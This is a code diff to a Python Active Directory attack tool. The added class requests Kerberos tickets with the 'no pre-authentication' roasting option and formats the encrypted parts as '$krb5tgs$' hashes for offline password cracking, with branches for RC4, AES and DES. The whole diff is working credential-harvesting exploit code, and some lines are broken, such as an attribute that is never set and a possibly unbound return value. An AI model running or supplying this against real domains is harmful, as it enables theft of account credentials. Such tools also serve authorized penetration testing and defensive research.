@@ -141,14 +141,108 @@ def getName(machine):
 
 
 class TGS:
-    def __init__(self, domain, dc, password='', nthash='', lmhash='', aeskey='') -> None:
+    def __init__(self, domain, dc, username, password='', nthash='', lmhash='', aeskey='', no_preauth=True) -> None:
         self.domain = domain
         self.dc = dc
+        self.username = username
         self.password = password
         self.nthash = nthash
         self.lmhash = lmhash
         self.aeskey = aeskey
         self.dc_ip = socket.gethostbyname(self.dc)
+        self.no_preauth = no_preauth
     
     def get_TGT(self):
-        pass
+        userName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        tgt, cipher, oldSessioKey, sessionKey = getKerberosTGT(userName, password=self.password, 
+                                                               domain=self.domain, nthash=self.nthash, 
+                                                               lmhash=self.lmhash, aesKey=self.aeskey, 
+                                                               kdcHost=self.dc_ip, kerberoast_no_preauth=True,
+                                                               serverName=self.username)
+        return {'tgt':tgt, 'cipher':cipher, 'old':oldSessioKey, 'new':sessionKey}
+
+
+    def outputTGS(self, ticket, oldSessionKey, sessionKey, fd=None):
+        username = self.username
+        spn = self.domain + '/' + username
+        if self.no_preauth:
+            decodedTGS = decoder.decode(ticket, asn1Spec=AS_REP())[0]
+        else:
+            decodedTGS = decoder.decode(ticket, asn1Spec=TGS_REP())[0]
+        # According to RFC4757 (RC4-HMAC) the cipher part is like:
+        # struct EDATA {
+        #       struct HEADER {
+        #               OCTET Checksum[16];
+        #               OCTET Confounder[8];
+        #       } Header;
+        #       OCTET Data[0];
+        # } edata;
+        #
+        # In short, we're interested in splitting the checksum and the rest of the encrypted data
+        #
+        # Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)
+        # last 12 bytes of the encrypted ticket represent the checksum of the decrypted 
+        # ticket
+        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
+            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
+                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'],
+                spn.replace(':', '~'),
+                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
+                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
+            if fd is None:
+                print(entry)
+            else:
+                fd.write(entry + '\n')
+        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
+            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
+                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
+                spn.replace(':', '~'),
+                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
+                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
+            if fd is None:
+                print(entry)
+            else:
+                fd.write(entry + '\n')
+        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
+            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
+                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
+                spn.replace(':', '~'),
+                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
+                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
+            if fd is None:
+                print(entry)
+            else:
+                fd.write(entry + '\n')
+        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
+            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
+                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'],
+                spn.replace(':', '~'),
+                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
+                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
+            if fd is None:
+                print(entry)
+            else:
+                fd.write(entry + '\n')
+        else:
+            logging.error('Skipping %s/%s due to incompatible e-type %d' % (
+                decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
+                decodedTGS['ticket']['enc-part']['etype']))
+
+        if self.__saveTGS is True:
+            # Save the ticket
+            logging.debug('About to save TGS for %s' % username)
+            ccache = CCache()
+            try:
+                ccache.fromTGS(ticket, oldSessionKey, sessionKey)
+                ccache.saveFile('%s.ccache' % username)
+            except Exception as e:
+                logging.error(str(e))
+        return entry
+    def run(self):
+        tgt_data = self.get_TGT()
+        tgt = tgt_data['tgt']
+        cipher = tgt_data['cipher']
+        oldSessionKey = tgt_data['old']
+        sessionKey = tgt_data['new']
+        data = self.outputTGS(ticket=tgt, oldSessionKey=oldSessionKey, sessionKey=sessionKey)
+        return data
